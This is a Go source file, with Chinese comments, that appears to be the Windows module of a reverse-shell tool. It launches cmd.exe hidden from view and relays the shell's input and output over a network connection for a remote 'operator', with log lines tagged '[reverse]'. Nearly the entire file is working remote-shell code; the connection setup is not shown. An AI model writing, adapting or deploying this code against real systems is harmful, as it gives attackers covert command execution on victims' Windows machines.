//go:build windows

// Windows：管道模式（与其它语言实现一致的兜底方案）。
// cmd.exe 无窗口启动，双 goroutine 全双工转发；输入剥 CR、首行发 chcp。
package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"sync"
	"syscall"
	"time"
)

const createNoWindow = 0x08000000

func defaultShell() string { return "cmd.exe" }

// 操作员输入 -> 子进程 stdin；cmd 管道以 LF 分行，统一剥掉 CR。
func pumpConnToStdin(conn net.Conn, w *os.File, noChcp bool) {
	if !noChcp {
		_, _ = w.Write([]byte("chcp 65001>nul\r\n"))
	}
	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			out := make([]byte, 0, n)
			for _, b := range buf[:n] {
				if b != '\r' {
					out = append(out, b)
				}
			}
			if len(out) > 0 {
				if _, werr := w.Write(out); werr != nil {
					return
				}
			}
		}
		if err != nil {
			return
		}
	}
}

func runSession(cfg config, conn net.Conn) {
	cmd := exec.Command(cfg.shell)

	stdinR, stdinW, err := os.Pipe()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[reverse] 创建管道失败: %v\n", err)
		conn.Close()
		return
	}
	stdoutR, stdoutW, err := os.Pipe()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[reverse] 创建管道失败: %v\n", err)
		stdinR.Close()
		stdinW.Close()
		conn.Close()
		return
	}

	cmd.Stdin = stdinR
	cmd.Stdout = stdoutW
	cmd.Stderr = stdoutW
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}

	if err := cmd.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "[reverse] 启动 shell 失败: %v\n", err)
		stdinR.Close()
		stdinW.Close()
		stdoutR.Close()
		stdoutW.Close()
		conn.Close()
		return
	}
	stdinR.Close()  // 这两个句柄交给子进程
	stdoutW.Close()

	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		pumpConnToStdin(conn, stdinW, cfg.noChcp)
		stdinW.Close()
		_ = cmd.Process.Kill() // socket 断开：终止子进程
	}()
	go func() {
		defer wg.Done()
		_, _ = io.Copy(conn, stdoutR)
		conn.Close()
	}()

	_ = cmd.Wait()
	conn.Close() // 唤醒可能仍阻塞在 conn.Read 的输入 goroutine
	stdinW.Close()
	stdoutR.Close()
	done := make(chan struct{})
	go func() { wg.Wait(); close(done) }()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
	}
}
